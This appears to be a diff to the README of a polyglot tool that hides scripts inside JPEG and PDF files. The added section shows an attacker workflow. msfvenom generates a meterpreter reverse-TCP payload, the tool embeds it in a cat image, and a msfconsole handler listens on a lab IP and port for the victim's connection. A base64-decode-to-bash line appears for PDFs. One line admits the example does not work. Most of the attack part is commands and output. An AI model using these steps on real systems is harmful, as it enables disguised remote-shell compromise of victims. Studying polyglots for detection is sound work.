@@ -44,16 +44,35 @@ b) chmod +x cat-linenum.jpeg; ./cat-linenum.jpeg
 ```
 # Example 3 - Encoding a powershell script in a JPEG image. For example, a meterpreter
 
-# SERVER
+# SERVER: Steps in the attacker  --------------------------> No FUNCIONAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
 # Prepare the payload and configure the server to receive a meterpreter connection
 
-# msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out meterpreter.ps1 LHOST=<IP> LPORT=<PORT>
-# python3 powerglot.py -o meterpreter.ps1 cat.jpg cat-o.jpg
-# Check correct JPEG format
-  #file cat-o.jpg
-  # feh cat-o.jpg
+#msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f psh > meterpreter.ps1
 
-msf > use exploit/multi/handler msf exploit(multi/handler) > set payload windows/meterpreter_reverse_http payload => windows/meterpreter_reverse_http msf exploit(multi/handler) > set lhost <IP> lhost => <IP> msf exploit(multi/handler) > set lport <PORT> lport => <PORT> msf exploit(multi/handler) > exploit
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 123 bytes
+Final size of psh file: 1341 bytes
+
+# python3 ../powerglot.py -o meterpreter.ps1 cat.jpeg cat-ps.jpeg
+# file cat-ps.jpeg 
+cat-ps.jpeg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 328x328, segment length 291, thumbnail 1x1, comment: "cmp3.9.27.0Lq4 0xa362b87a", baseline, precision 8, 1000x563, components 3
+
+# msfconsole
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > set payload linux/
+Display all 103 possibilities? (y or n)
+msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set lhost 10.0.2.15                                                                 
+lhost => 10.0.2.15                                                                                                
+msf5 exploit(multi/handler) > set port 4444
+port => 4444                                                                                                      
+msf5 exploit(multi/handler) > exploit                                                                             
+                                                                                                                  
+[*] Started reverse TCP handler on 10.0.2.15:4444     
 
 # LINUX VICTIM
 # Download cat-o.jpg
@@ -62,12 +81,16 @@ msf > use exploit/multi/handler msf exploit(multi/handler) > set payload windows
 ```
 
 ```
-# Polyglot in PDF
-#base64 payload.sh (example linenum.sh)
-#Create script.sh
-echo "fasdfafdafdf=" | base64 .d | bash
+# Example de polyglot in PDF
+
+# base64 payload.sh (example linenum.sh)
+
+# Create b64.sh
+# echo "code in base64 of linenum.sh" | base64 -d | bash
 
 #python3 powerglot -o script.sh file.pdf file-1.pdf
+
+
 ```
 Some examples to detect polyglots in our filesystem
 ```
